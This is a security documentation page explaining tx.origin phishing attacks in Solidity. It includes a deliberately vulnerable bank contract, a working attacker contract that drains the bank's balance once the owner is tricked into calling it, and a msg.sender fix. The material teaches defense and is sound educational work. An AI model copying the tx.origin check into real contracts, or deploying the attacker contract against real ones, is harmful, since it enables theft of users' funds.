---
title: Tx Origin Attacks
displayed_sidebar: generalSidebar
---

A transaction origin attack is form of phising attack that can drain a contract of all funds.

In Solidity, `tx.origin` retrieves the address of the transaction originator, distinguishing it from `msg.sender`. Let's use an example to understand their differences. Imagine that User A calls Contract B, which then calls Contract C. For Contract C, `msg.sender` would be Contract B, while `tx.origin` would still be User A.

Using `tx.origin` for authentication in a smart contract could pose security risks. An attacker could deploy a malicious contract and trick the owner of a bank contract into calling it. Even though `msg.sender` would be the address of the attacker’s contract, `tx.origin` would still show the bank contract owner’s address, potentially allowing unauthorized transactions.

#### Simple Bank Contract

This simple bank contract tracks the owner and includes a constructor and a public method:

- **Constructor**: Assigns the `bankOwner` variable during contract creation.
- **sendFunds()**: Takes two parameters, `recipient` and `amount`. It checks if `tx.origin == bankOwner` and, if true, transfers `amount` of ETH to `recipient`.

```solidity
contract SimpleBank {
    address public bankOwner; // tracks the contract's owner

    constructor() payable {
        bankOwner = msg.sender;
    }


    // This method is vulnerable to phishing attacks
    function sendFunds(address payable recipient, uint amount) public {
        require(tx.origin == bankOwner, "Caller is not the owner");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

#### Hacker Contract

The malicious contract’s logic is simple: to fish the balance from the bank contract owner to the attacker’s address. It includes two state variables `thief` and `target`:

- **Constructor**: Initializes `target` contract address.
- **launchAttack()**: When called by the bank contract’s owner, it forces a transaction from the bank to the hacker’s address.

```solidity
contract Hacker {
    address payable public thief;
    SimpleBank target;

    constructor(SimpleBank _target) {
        target = SimpleBank(_target);
        thief = payable(msg.sender);
    }

    function launchAttack() public {
        target.sendFunds(thief, address(target).balance);
    }
}
```

#### Prevention Strategy

**Using `msg.sender` instead of `tx.origin`**:
   `msg.sender` accurately identifies the direct caller of the contract, thereby preventing any interference by external malicious contracts.
   ```solidity
   function sendFunds(address payable recipient, uint amount) public {
           require(msg.sender == bankOwner, "Caller is not the owner");
           (bool success, ) = recipient.call{value: amount}("");
           require(success, "Transfer failed");
       }
   ```